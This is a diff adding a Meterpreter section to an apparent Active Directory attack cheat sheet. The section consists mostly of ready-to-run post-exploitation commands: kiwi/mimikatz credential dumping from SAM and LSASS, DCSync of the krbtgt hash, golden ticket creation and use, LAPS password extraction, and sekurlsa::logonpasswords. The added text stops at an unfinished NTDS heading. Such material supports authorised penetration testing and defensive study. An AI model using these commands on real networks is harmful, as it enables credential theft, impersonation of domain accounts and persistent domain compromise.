@@ -161,3 +161,51 @@ or
 ```
 
 **Meterpreter:**
+
+Although all the previous methods included in this document are "manually doing", metasploit has provided us with a meterpreter extension called kiwi capable of this most of this looting. 
+
+Dump the SAM & the LSASS(if LSA is enabled you need ot disabled it first):
+
+```
+#From a meterpreter session
+1. load kiwi
+2. creds_all
+
+Alternatively to dump only the SAM:
+#From a meterpreter session
+1. hashdump
+```
+
+To perform DcSync:
+
+```
+#From a meterpreter session
+1. load kiwi
+2. dcsync_ntlm contoso.com\krbtgt
+```
+
+To create and use a golden ticket:
+
+```
+#From a meterpreter session
+1. load kiwi
+2. golden_ticket_create -d contoso.com -u trike -s <sid_of_the_user_you_want_to_impersonate> -k <krbtgt_ntlm_hash> -t /root/Downloads/contoso.tck
+3. kerberos_ticket_use /root/Downloads/contoso.tck
+```
+
+To read LAPS:
+
+```
+#From a meterpreter session
+1. run post/windows/gather/credentials/enum_laps
+```
+
+Alternatively, you can use "kiwi_cmd" from a meterpreter shell to execute any mimikatz command:
+
+```
+1. load kiwi
+2. kiwi_cmd "sekurlsa::logonpasswords"
+```
+
+Dumping the NTDS from metaspoit:
+
